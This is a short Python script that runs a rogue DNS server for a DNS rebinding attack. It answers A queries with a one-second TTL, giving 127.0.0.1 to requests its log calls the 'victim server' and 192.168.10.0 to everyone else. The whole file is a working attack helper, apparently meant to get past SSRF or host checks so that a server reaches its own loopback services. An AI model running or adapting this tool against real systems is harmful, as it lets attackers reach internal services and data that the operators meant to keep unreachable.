#!env python3
import socket
from time import time
import datetime


class DNSQuery:
	def __init__(self, data):
		self.data = data
		self.domain = ''
		self.qtype = 0

		opcode = (ord(data[2]) >> 3) & 15
		if opcode == 0:
			ini = 12
			lon = ord(data[ini])
			while lon != 0:
				self.domain += data[ini+1:ini+lon+1] + '.'
				ini += lon + 1
				lon = ord(data[ini])
			self.qtype = ord(data[12+len(self.domain)+2])

	def reply(self, ip):
		packet = ''
		if self.domain:
			packet += self.data[:2] + '\x81\x80'
			packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
			packet += self.data[12:12+len(self.domain)+5] # original question
			packet += '\xc0\x0c'
			packet += '\x00\x01\x00\x01\x00\x00\x00\x01\x00\x04' # response type, ttl, resource data length (4 bytes)
			packet += ''.join(chr(int(x)) for x in ip.split('.'))
		return packet


'''
Prints positive message (in green)
'''
def message_positiv(message):
    print('\033[92m' +"[+] " + message + '\033[0m')


'''
Prints info message
'''
def message_info(message):
    print("[*] " + message)


if __name__ == '__main__':
	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	dnsPort = 7054
	udp.bind(('',dnsPort))
	message_info("Binding DNS server on Port: " + str(dnsPort))
	
	firstRequest = True # Track if first request
	ip = "192.168.10.0" # Default IP
	try:
		while 1:
			data, addr = udp.recvfrom(1024)
			p = DNSQuery(data)
			# only IN A questions are supported
			if p.domain and p.qtype == 1:
				if addr[0] == "127.0.0.1": # if request from victim IP
					message_positiv(str(datetime.datetime.now()) + " ->  Got request from victim server. IP: " + str(addr[0]))				
					ip = "127.0.0.1"
				else:
					message_info("Got request from IP: " + str(addr[0]))
				
				message_info("	" + p.domain + " -> " + str(ip))
				udp.sendto(p.reply(ip), addr)

	except KeyboardInterrupt:
		udp.close()

